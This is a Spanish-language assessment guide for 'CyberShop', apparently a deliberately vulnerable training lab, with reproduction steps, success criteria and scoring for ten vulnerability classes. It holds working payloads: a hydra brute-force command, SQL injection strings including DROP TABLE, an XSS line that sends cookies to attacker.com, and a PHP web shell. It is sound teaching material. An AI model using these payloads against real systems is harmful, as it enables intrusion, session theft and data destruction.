# 🔓 Guía de Evaluación de Vulnerabilidades - CyberShop

Esta guía detalla todas las vulnerabilidades implementadas en CyberShop, cómo reproducirlas, y los criterios de evaluación para cada una.

⚠️ **ADVERTENCIA**: Esta guía contiene información sensible sobre vulnerabilidades. Usar solo en entornos controlados.

## 📝 Índice
1. [Broken Authentication](#1-broken-authentication)
2. [Sensitive Data Exposure](#2-sensitive-data-exposure)
3. [SQL Injection](#3-sql-injection)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Insecure Deserialization](#5-insecure-deserialization)
6. [Insufficient Logging](#6-insufficient-logging)
7. [Broken Access Control](#7-broken-access-control)
8. [Security Misconfiguration](#8-security-misconfiguration)
9. [File Upload Vulnerabilities](#9-file-upload-vulnerabilities)
10. [API Security Issues](#10-api-security-issues)

## 1. Broken Authentication

### Descripción
La aplicación implementa un sistema de autenticación vulnerable que permite varios tipos de ataques.

### Vulnerabilidades Específicas

#### 1.1 Tokens JWT Sin Firma
- **Ubicación**: `/api/v1/auth/login`
- **Descripción**: Los tokens JWT no están firmados y pueden ser modificados
- **Pasos**:
  1. Iniciar sesión como usuario normal
  2. Decodificar el token JWT (base64)
  3. Modificar el payload (ej: cambiar rol a 'admin')
  4. Codificar de nuevo en base64
- **Payload de ejemplo**:
  ```json
  {
    "sub": "user@test.com",
    "role": "admin",
    "exp": 999999999
  }
  ```
- **Criterio de éxito**: El token modificado es aceptado y otorga privilegios de administrador
- **Impacto**: Escalación de privilegios

#### 1.2 Sesiones Sin Expiración
- **Ubicación**: `/api/v1/auth/login`
- **Descripción**: Los tokens no tienen tiempo de expiración efectivo
- **Pasos**:
  1. Iniciar sesión y obtener token
  2. Esperar más de 24 horas
  3. Usar el mismo token
- **Criterio de éxito**: El token sigue siendo válido después de 24 horas
- **Impacto**: Posible robo de sesión y acceso no autorizado prolongado

#### 1.3 Fuerza Bruta en Login
- **Ubicación**: `/api/v1/auth/login`
- **Descripción**: No hay límite de intentos de login
- **Pasos**:
  1. Intentar login múltiples veces con diferentes contraseñas
  2. Usar herramienta automatizada (ej: hydra)
- **Payload de ejemplo**:
  ```bash
  hydra -l admin@cybershop.com -P wordlist.txt cybershop-api http-post-form "/api/v1/auth/login:email=^USER^&password=^PASS^:Invalid credentials"
  ```
- **Criterio de éxito**: Poder realizar más de 100 intentos sin bloqueo
- **Impacto**: Compromiso de cuentas mediante fuerza bruta

## 2. Sensitive Data Exposure

### 2.1 Contraseñas en Texto Plano
- **Ubicación**: `/api/v1/users`
- **Descripción**: Las contraseñas se almacenan y transmiten sin cifrar
- **Pasos**:
  1. Registrar nuevo usuario
  2. Interceptar respuesta con Burp Suite
  3. Verificar respuesta JSON
- **Criterio de éxito**: Contraseña visible en texto plano en respuesta
- **Impacto**: Compromiso directo de credenciales

### 2.2 Información Sensible en Respuestas
- **Ubicación**: `/api/v1/orders`
- **Descripción**: Datos de tarjetas y personales expuestos en API
- **Pasos**:
  1. Realizar una compra
  2. Verificar respuesta de orden
- **Criterio de éxito**: Números de tarjeta y CVV visibles en respuesta
- **Impacto**: Robo de información financiera

## 3. SQL Injection

### 3.1 Búsqueda de Productos Vulnerable
- **Ubicación**: `/api/v1/products/search`
- **Descripción**: Parámetro de búsqueda vulnerable a SQLi
- **Pasos**:
  1. Usar búsqueda de productos
  2. Inyectar payload SQL
- **Payloads de ejemplo**:
  ```sql
  ' OR '1'='1
  ' UNION SELECT id,email,password,NULL,NULL FROM users--
  ' ORDER BY 10--
  ```
- **Criterio de éxito**: Obtener información de usuarios o manipular consulta
- **Impacto**: Acceso no autorizado a datos

### 3.2 Inyección en Panel Admin
- **Ubicación**: `/api/v1/admin/users`
- **Descripción**: Filtros de administración vulnerables
- **Pasos**:
  1. Acceder como admin
  2. Usar filtro de usuarios
- **Payload de ejemplo**:
  ```sql
  '; DROP TABLE users--
  '; UPDATE users SET role='admin'--
  ```
- **Criterio de éxito**: Modificar datos o estructura de BD
- **Impacto**: Manipulación de base de datos

## 4. Cross-Site Scripting (XSS)

### 4.1 XSS en Comentarios
- **Ubicación**: `/api/v1/products/{id}/comments`
- **Descripción**: Comentarios sin sanitizar permiten XSS
- **Pasos**:
  1. Agregar comentario en producto
  2. Insertar payload XSS
- **Payloads de ejemplo**:
  ```javascript
  <script>alert(document.cookie)</script>
  <img src=x onerror="fetch('http://attacker.com/'+document.cookie)">
  <svg onload="alert(1)">
  ```
- **Criterio de éxito**: Script ejecutado al ver comentario
- **Impacto**: Robo de sesión, defacement

### 4.2 XSS en Perfil
- **Ubicación**: `/api/v1/users/profile`
- **Descripción**: Campos de perfil permiten HTML
- **Pasos**:
  1. Editar perfil
  2. Insertar payload en bio
- **Criterio de éxito**: HTML/JavaScript ejecutado en perfil
- **Impacto**: Ataque a otros usuarios

## 5. Insecure Deserialization

### 5.1 Carrito Vulnerable
- **Ubicación**: `/api/v1/cart`
- **Descripción**: Datos del carrito en cookie insegura
- **Pasos**:
  1. Agregar items al carrito
  2. Modificar cookie serializada
- **Payload de ejemplo**:
  ```python
  # Cookie original (base64)
  # Modificar cantidad y precio
  ```
- **Criterio de éxito**: Manipular precios/cantidades
- **Impacto**: Fraude en compras

## 6. Insufficient Logging

### 6.1 Sin Registro de Eventos
- **Ubicación**: Toda la aplicación
- **Descripción**: Eventos críticos no registrados
- **Pasos**:
  1. Realizar intentos de login fallidos
  2. Verificar logs
- **Criterio de éxito**: Ausencia de logs de seguridad
- **Impacto**: Imposibilidad de detectar ataques

## 7. Broken Access Control

### 7.1 IDOR en Perfiles
- **Ubicación**: `/api/v1/users/{id}`
- **Descripción**: Acceso directo a perfiles por ID
- **Pasos**:
  1. Obtener ID propio
  2. Modificar ID en requests
- **Criterio de éxito**: Acceder a perfiles ajenos
- **Impacto**: Violación de privacidad

### 7.2 Bypass de Autorización
- **Ubicación**: `/api/v1/admin/*`
- **Descripción**: Verificación de roles inadecuada
- **Pasos**:
  1. Identificar endpoint admin
  2. Acceder sin privilegios
- **Criterio de éxito**: Acceso a funciones admin
- **Impacto**: Escalación de privilegios

## 8. Security Misconfiguration

### 8.1 Headers Inseguros
- **Ubicación**: Todas las respuestas HTTP
- **Descripción**: Headers de seguridad ausentes
- **Pasos**:
  1. Inspeccionar headers de respuesta
  2. Verificar ausencia de:
     - X-Frame-Options
     - CSP
     - HSTS
- **Criterio de éxito**: Headers de seguridad ausentes
- **Impacto**: Múltiples vectores de ataque

## 9. File Upload Vulnerabilities

### 9.1 Subida de Archivos Maliciosos
- **Ubicación**: `/api/v1/users/avatar`
- **Descripción**: Sin validación de archivos
- **Pasos**:
  1. Crear shell PHP
  2. Subir como avatar
- **Payload de ejemplo**:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- **Criterio de éxito**: Ejecución de comandos
- **Impacto**: RCE

## 10. API Security Issues

### 10.1 Endpoints Internos Expuestos
- **Ubicación**: `/api/v1/internal/*`
- **Descripción**: APIs internas accesibles
- **Pasos**:
  1. Enumerar endpoints
  2. Acceder sin autenticación
- **Criterio de éxito**: Acceso a APIs internas
- **Impacto**: Exposición de funcionalidad interna

## 📊 Sistema de Puntuación

Cada vulnerabilidad tiene una puntuación máxima de 10 puntos:
- **Identificación**: 3 puntos
- **Explotación exitosa**: 4 puntos
- **Documentación del proceso**: 3 puntos

### Niveles de Gravedad
- **Crítica** (9-10 puntos): RCE, SQLi que compromete toda la BD
- **Alta** (7-8 puntos): Bypass de autenticación, XSS persistente
- **Media** (5-6 puntos): IDOR, XSS reflejado
- **Baja** (3-4 puntos): Información sensible en respuestas
- **Informativa** (1-2 puntos): Headers faltantes, logs insuficientes

## 📝 Formato de Reporte

Para cada vulnerabilidad encontrada, documentar:
1. Nombre y descripción
2. Pasos de reproducción
3. Impacto y severidad
4. Evidencia (screenshots, códigos, etc.)
5. Recomendaciones de mitigación

## 🎯 Objetivos de Aprendizaje

- Identificar vulnerabilidades comunes
- Entender el impacto de cada vulnerabilidad
- Practicar técnicas de explotación
- Desarrollar habilidades de documentación
- Comprender medidas de mitigación

## ⚠️ Advertencia Legal

Este laboratorio es solo para fines educativos. No aplicar estas técnicas en sistemas reales sin autorización explícita.
